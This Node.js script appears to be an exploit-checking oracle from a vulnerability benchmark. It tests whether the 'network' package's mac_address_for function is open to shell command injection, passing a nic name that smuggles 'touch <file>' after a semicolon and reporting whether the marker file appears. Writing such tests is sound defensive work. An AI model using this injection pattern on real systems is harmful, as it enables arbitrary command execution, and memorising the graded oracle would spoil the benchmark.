'use strict';
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

function main() {
  if (process.platform !== 'linux' && process.platform !== 'darwin') {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'unsupported platform for this oracle: ' + process.platform
    }));
    return;
  }

  let network;
  try {
    network = require('network');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + String(e && e.message)
    }));
    return;
  }

  const marker = 'netpkg_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const markerFile = path.join(os.tmpdir(), marker + '.txt');

  // Step 1: benign call - use a plausible (likely non-existent but syntactically valid) nic name.
  // We just need mac_address_for to execute without throwing synchronously and to call back.
  let benignCompleted = false;

  try {
    network.mac_address_for('eth0', function (err, mac) {
      // Callback may report an error (interface not found) - that's fine,
      // as long as the call executed without crashing/throwing synchronously.
      benignCompleted = true;

      // Step 2: malicious call - attempt command injection via nic_name.
      const maliciousNic = 'eth0; touch ' + markerFile + ' #';

      let maliciousThrew = false;
      let maliciousError = null;

      try {
        network.mac_address_for(maliciousNic, function (err2, mac2) {
          // Give the shell command a brief moment to complete, then check.
          setTimeout(function () {
            let exploit_succeeded = false;
            let evidence = '';

            try {
              if (fs.existsSync(markerFile)) {
                exploit_succeeded = true;
                evidence = 'Marker file was created via injected shell command: ' + markerFile;
                try { fs.unlinkSync(markerFile); } catch (_) {}
              } else {
                evidence = 'Marker file not created; injection did not execute. err2=' + (err2 ? String(err2.message || err2) : 'none');
              }
            } catch (checkErr) {
              evidence = 'Error while checking marker file: ' + String(checkErr && checkErr.message);
            }

            console.log('ORACLE_RESULT ' + JSON.stringify({
              operation_completed: benignCompleted,
              exploit_succeeded: exploit_succeeded,
              evidence: evidence
            }));
          }, 500);
        });
      } catch (synchronousThrow) {
        // Patched version validates nic name synchronously and throws.
        let exploit_succeeded = false;
        let evidence = '';

        try {
          if (fs.existsSync(markerFile)) {
            exploit_succeeded = true;
            evidence = 'Marker file exists despite synchronous throw: ' + markerFile;
            try { fs.unlinkSync(markerFile); } catch (_) {}
          } else {
            evidence = 'Malicious call blocked synchronously (validation threw): ' + String(synchronousThrow && synchronousThrow.message);
          }
        } catch (checkErr) {
          evidence = 'Error while checking marker file after throw: ' + String(checkErr && checkErr.message);
        }

        console.log('ORACLE_RESULT ' + JSON.stringify({
          operation_completed: benignCompleted,
          exploit_succeeded: exploit_succeeded,
          evidence: evidence
        }));
      }
    });
  } catch (benignThrow) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign operation threw unexpectedly: ' + String(benignThrow && benignThrow.message)
    }));
    return;
  }

  // Safety net in case neither callback fires within a reasonable time.
  setTimeout(function () {
    if (!benignCompleted) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'timed out waiting for benign callback to fire'
      }));
    }
  }, 5000).unref();
}

main();
